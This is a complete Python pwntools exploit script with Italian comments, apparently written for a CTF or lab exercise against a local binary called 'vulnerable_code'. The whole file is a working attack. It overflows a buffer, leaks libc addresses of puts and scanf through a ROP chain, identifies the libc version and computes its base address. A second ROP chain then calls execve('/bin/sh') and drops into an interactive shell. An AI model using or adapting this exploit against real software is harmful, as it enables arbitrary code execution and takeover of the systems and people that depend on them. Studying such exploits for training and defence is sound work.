from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 136
binsh = "/bin/sh\x00"

# *--------------------- Gadgets --------------------*

where_to_write = p64(0x404050) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = p64(0x40134c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40134e) # pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x401353) # pop rdi; ret;
pop_rbp = p64(0x4011dd) # pop rbp; ret;
pop_rsi = p64(0x401351) # pop rsi; pop r15; ret;
mov_rax_r13 = p64(0x4011b8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40114a) # mov qword ptr [r13], r12; ret;
add_mmrax_rbp = p64(0x401178) # add qword ptr [rax], rbp; ret;
xor_rdx = p64(0x4011e8) # xor edx, edx; ret;

# *--------------------- Funzioni -------------------*

def set_env(binary) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop
    
def send_payload(list) :  # se w_off Ã¨ true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop = set_env('./vulnerable_code') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("2")
p.recvlines(2) # inserisci username 

# *- ROP CHAIN -> leak indirizzo effettivo puts libc -*

rop = ROP(elf)
rop.raw(elf.symbols["puts"])                              # stampa '\n'
rop.call(elf.symbols["puts"],[elf.got["puts"]])           # stampa indirizzo puts
rop.call(elf.symbols["puts"],[elf.got["__isoc99_scanf"]]) # stampa indirizzo scnaf
rop.raw(elf.symbols["change_username"])                   # richiama change_username

payload = dict()
payload[offset] = rop
p.sendline(fit(payload))

p.recvlines(3)

# *---------  leak libc version with databse ---------*

puts_lib_idx = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
scanf_lib_idx = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"Trovato l'indirzzo dove risiede in memoria la funzione puts nella libc : {hex(puts_lib_idx)}")
log.info(f"Trovato l'indirzzo dove risiede in memoria la funzione scanf nella libc : {hex(scanf_lib_idx)}")
# ricerca tramite il databse delle libc disponibile al seguente url : https://libc.blukat.me/
log.info(f"Trovata la segunete versione di libreria associata all'indirizzo di puts : libc6_2.31-0ubuntu9.2_amd64.so")

# *--  caricamento del file elf della libc trovata ---*

libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")

# *----- calcolo indirizzo di start della libc  ------*

libc.address = puts_lib_idx - libc.symbols["puts"]
log.info(f"Trovato l'indirzzo di partenza su cui risiedono le funzioni di in memoria : {hex(libc.address)}")

# *------  cerco idx della stringa /bin/sh\x00 -------*

binsh = next(libc.search(b"/bin/sh\x00")) # nella libc possiamo trovare la stringa /bin/sh, allora recuperriamo il suo indirizzo
log.info(f"Trovato l'indirzzo su cui risiede la stringa /bin/sh : {hex(binsh)}")

# *---  richiamo la funzione per invocare la shell ---*

p.recvuntil(":") # insert username

rop = ROP([elf,libc])
# rop.call("system",[binsh]) # metodo alternativo per invocare la shell
rop.execve(binsh,0,0)

payload = dict()
payload[offset] = rop
p.sendline(fit(payload))


p.recvlines(3)
p.interactive()

# *----------------------  END  ----------------------*